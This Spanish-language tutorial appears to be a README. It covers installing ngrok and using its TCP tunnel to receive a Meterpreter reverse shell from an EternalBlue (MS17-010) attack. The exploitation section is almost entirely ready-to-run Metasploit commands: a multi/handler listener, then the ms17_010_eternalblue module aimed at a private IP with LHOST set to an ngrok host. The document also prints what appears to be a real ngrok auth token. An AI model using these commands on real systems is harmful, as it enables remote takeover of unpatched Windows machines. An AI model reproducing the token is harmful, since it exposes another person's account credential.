Ngrok
================

Descarga e Instalación
---------------------------------------------------

Ingrese a ngrok: https://ngrok.com/

![image](https://user-images.githubusercontent.com/50930193/170136583-5c92913b-2d15-46ab-896c-9f5f0301ed5e.png)

Crear una cuenta

![image](https://user-images.githubusercontent.com/50930193/170136734-fa6e3edb-a054-4da7-b211-b341ad92acec.png)

Descargar el ngrok, descomprimirlo y 

![image](https://user-images.githubusercontent.com/50930193/166869422-e43a2d0a-00cb-4aae-8bf5-4e58372cac73.png)

```
unzip /path/to/ngrok.zip
```
Incluir el token asignado a su usuario
```
./ngrok config add-authtoken 1eIYtv2l1jl2MNxkFcMbrsRyrh1_5DmN92ELBPd9MNZbd4Q2a
```
![image](https://user-images.githubusercontent.com/50930193/170138858-c2f36ce3-82c3-4bf9-9533-27dabe0b1f51.png)


Uso
---------------------------------------------------
Usar ngrok en el puerto 1234

```
./ngrok tcp 1234
```

![image](https://user-images.githubusercontent.com/50930193/170138987-c719fe73-fa98-4009-9f54-2773e5cf0c8d.png)


Explotación de Eternalblue
---------------------------------------------------
1. Ejecutar ngrok
```
./ngrok tcp 80
```
![image](https://user-images.githubusercontent.com/50930193/170810197-a2b722eb-7e6f-4e42-b8e9-d192f30c2260.png)

2. Ejecutar un listener
```
msfconsole -q
search multi/handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set exitfunc thread
set lhost 127.0.0.1
set lport 80
set exitonsession false
exploit -j -z
```
3. Ejecutar un listener
```
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS  192.168.109.174
set LHOST 0.tcp.sa.ngrok.io
set LPORT 14696
set RPORT 445
exploit
```

![image](https://user-images.githubusercontent.com/50930193/170810358-bebcd2e6-2005-4068-8bc9-8ee9a140e47b.png)
